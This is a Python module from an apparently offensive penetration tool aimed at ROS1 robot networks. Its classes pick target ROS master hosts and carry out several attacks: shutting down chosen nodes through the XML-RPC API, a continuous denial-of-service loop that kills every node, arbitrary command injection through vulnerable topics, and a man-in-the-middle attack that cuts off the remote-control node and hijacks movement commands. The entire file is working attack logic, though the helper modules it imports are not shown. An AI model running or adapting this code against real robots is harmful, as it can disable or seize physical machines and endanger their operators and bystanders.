#!/usr/bin/env python3

import sys
import time
import os
import threading
from termcolor import colored, cprint

from modulesROS1 import analyser
from modulesROS1.toolbox import api
from modulesROS1.toolbox import ros_tool


class Targeting:
    """
    selecting target to exploit.
    """

    def __init__(self, master_hosts):
        self.master_hosts = master_hosts


    def autoSelectTarget(self, type, attack):
        """ Auto select target host """

        sys.stdout.write(colored("\r[+] Auto selecting target: " + self.master_hosts[0][0], 'green', attrs=['bold']))
        time.sleep(1.5)
        sys.stdout.flush()
        analyse = analyser.ROSAnalyser(self.master_hosts)

        if type == 'node':
            return analyse.nodesAnalyser(self.master_hosts[0][0], self.master_hosts[0][1])
        elif type == 'topic' and attack == 'ACI':
            return analyse.topicAnalyser(self.master_hosts[0][0], self.master_hosts[0][1], attack)
        elif type == 'dos':
            pass
        elif type == 'topic' and attack == 'MITM':
            return analyse.topicAnalyser(self.master_hosts[0][0], self.master_hosts[0][1], attack)


    def manualSelectTarget(self, type, attack):
        """ Manual select target host """

        counter = 1
        cprint("[!] The following ROS1 environments are found with ip address:", 'white', attrs=['bold'])
        for master in self.master_hosts:
            print("  [{}] {}".format(counter, master[0]))
            counter += 1

        while True:
            try:
                option = int(input("\rSelect ROS environment to attack: "))
                print()
                if option in range(len(self.master_hosts) + 1):
                    host = self.master_hosts[(option - 1)][0]
                    port = self.master_hosts[(option - 1)][1]
                    analyse = analyser.ROSAnalyser(self.master_hosts[(option - 1)])

                    if type == 'node':
                        nodes = analyse.nodesAnalyser(host, port)
                        return nodes, host, port
                    elif type == 'topic' and attack == 'ACI':
                        topics = analyse.topicAnalyser(host, port, attack)
                        return topics, host, port
                    elif type == 'dos':
                        return host, port
                    elif type == 'topic' and attack == 'MITM':
                        exploitable_cmd_vel = analyse.topicAnalyser(host, port, attack)
                        return exploitable_cmd_vel, host, port

                else:
                    sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                    time.sleep(1.5)

            except ValueError:
                sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                time.sleep(1.5)


class SingleShutdown(Targeting):
    """
    Attack type: Single Node Shutdown
    """

    def __init__(self, master_hosts):
        super().__init__(master_hosts)

    def execShutdown(self, host, port, nodes):
        """ executing the shutdown XML API """

        while True:
            try:
                option = int(input("\nSelect node to shutdown: "))
                if option in range(len(nodes) + 1):
                    rpc = api.XMLRPC_API(host, port)
                    rpc.shutdown(nodes[(option - 1)][1])
                    os.system('clear')
                    print(colored("[+] Successfully send shutdown command to node: {}".
                                format(nodes[(option - 1)][0]), 'green', attrs=['bold']))
                    break

                else:
                    sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                    time.sleep(1.5)

            except ValueError:
                sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                time.sleep(1.5)


    def invokeShutdown(self):
        """ starts SingleShutDown attack """

        if len(self.master_hosts) == 1:
            nodes = self.autoSelectTarget('node', '')
            self.execShutdown(self.master_hosts[0][0], self.master_hosts[0][1], nodes)

        else:
            nodes, host, port = self.manualSelectTarget('node', '')
            self.execShutdown(host, port, nodes)



class DoSAttack(Targeting):
    """
    Attack type: Denial of Service
    """

    def __init__(self, master_hosts):
        super().__init__(master_hosts)


    def execDoS(self, host, port):
        """ shutting down nodes """

        rpc = api.XMLRPC_API(host, port)
        nodes = rpc.filterNodes()
        if len(nodes) > 0:
            for node in nodes:
                rpc.shutdown(node[1])


    def invokeDoS(self):
        """ starts DoS attack """

        if len(self.master_hosts) == 1:
            self.autoSelectTarget('dos', '')

            cprint("\r[+] Running DoS attack on target network: {}".format(self.master_hosts[0][0]), 'green', attrs=['bold'])
            cprint("\n[!] Press (Ctrl + C) to stop the attack", 'white', attrs=['bold'])

            while True:
                try:
                    self.execDoS(self.master_hosts[0][0], self.master_hosts[0][1])
                    time.sleep(1)
                except KeyboardInterrupt:
                    break

        else:
            host, port = self.manualSelectTarget('dos', '')
            cprint("\r[+] Executing DoS attack on target: {}".format(host), 'green', attrs=['bold'])
            cprint("[!] Press (Ctrl + C) to stop DoS attack", 'white')

            while True:
                try:
                    self.execDoS(host, port)
                    time.sleep(1)
                except KeyboardInterrupt:
                    os.system('clear')
                    break


class ACIAttack(Targeting):
    """
    Attack type: Arbitrary Command Injection
    """

    def __init__(self, master_hosts):
        super().__init__(master_hosts)


    def execACI(self, host, port, exploitable_topics):
        """ executing the ROS commands and sources ROS environment on attacker system """

        while True:
            try:
                option = int(input("\rSelect option: "))
                if option in range(len(exploitable_topics) + 1):
                    tool = ros_tool.ROSToolbox(host, port)
                    tool.exportEnvironment()
                    tool.vulnTopicsACI(exploitable_topics[(option - 1)][0])
                    break

                else:
                    sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                    time.sleep(1.5)
            except ValueError:
                sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                time.sleep(1.5)


    def invokeACI(self):
        """ Starts ACI attack """

        if len(self.master_hosts) == 1:
            exploitable_topics = self.autoSelectTarget('topic', 'ACI')
            if len(exploitable_topics) > 0:
                self.execACI(self.master_hosts[0][0], self.master_hosts[0][1], exploitable_topics)
            else:
                os.system('clear')
                cprint("[-] The target is not vulnerable for this attack", 'red', attrs=['bold'])

        else:
            exploitable_topics, host, port = self.manualSelectTarget('topic', 'ACI')
            if len(exploitable_topics) > 0:
                self.execACI(host, port, exploitable_topics)
            else:
                os.system('clear')
                cprint("[-] The target is not vulnerable for this attack", 'red', attrs=['bold'])


class MITMAttack(Targeting):
    """
    Attack type: Man in the Middle
    """

    def __init__(self, master_hosts):
        super().__init__(master_hosts)


    def selectRC(self, nodes):
        """ selecting RC node """

        while True:
            try:
                option = int(input("\nSelect the Remote Control node to isolate it from the network: "))
                if option in range(len(nodes) + 1):
                    return nodes[(option - 1)]

                else:
                    sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                    time.sleep(1.5)
            except ValueError:
                sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                time.sleep(1.5)


    def isolateRC(self, host, port, rc_node):
        """ executes targeted DoS attack to isolate the remote control host """

        rpc = api.XMLRPC_API(host, port)
        nodes = rpc.filterNodes()
        if len(nodes) > 0:
            for node in nodes:
                if rc_node[0] == node[0]:
                    rpc.shutdown(node[1])


    def invokeMITM(self):
        """ Starts MITM attack """

        if len(self.master_hosts) == 1:
            exploitable_cmd_vel = self.autoSelectTarget('topic', 'MITM')

            if exploitable_cmd_vel == True:
                analyse = analyser.ROSAnalyser(self.master_hosts)
                nodes = analyse.nodesAnalyser(self.master_hosts[0][0], self.master_hosts[0][1])

                rc_node = self.selectRC(nodes)

                tool = ros_tool.ROSToolbox(self.master_hosts[0][0], self.master_hosts[0][1])
                tool.exportEnvironment()

                attack = threading.Thread(target=tool.keyboardMITM)
                attack.start()
                while attack.isAlive():
                    self.isolateRC(self.master_hosts[0][0], self.master_hosts[0][1], rc_node)
                    time.sleep(1)
                os.system('clear')
            else:
                os.system('clear')
                cprint("[-] The target is not vulnerable for this attack", 'red', attrs=['bold'])

        else:
            exploitable_cmd_vel, host, port = self.manualSelectTarget('topic', 'MITM')

            if exploitable_cmd_vel == True:
                analyse = analyser.ROSAnalyser(self.master_hosts)
                nodes = analyse.nodesAnalyser(host, port)

                rc_node = self.selectRC(nodes)

                tool = ros_tool.ROSToolbox(host, port)
                tool.exportEnvironment()

                attack = threading.Thread(target=tool.keyboardMITM)
                attack.start()
                while attack.isAlive():
                    self.isolateRC(host, port, rc_node)
                    time.sleep(1)
                os.system('clear')
            else:
                os.system('clear')
                cprint("[-] The target is not vulnerable for this attack", 'red', attrs=['bold'])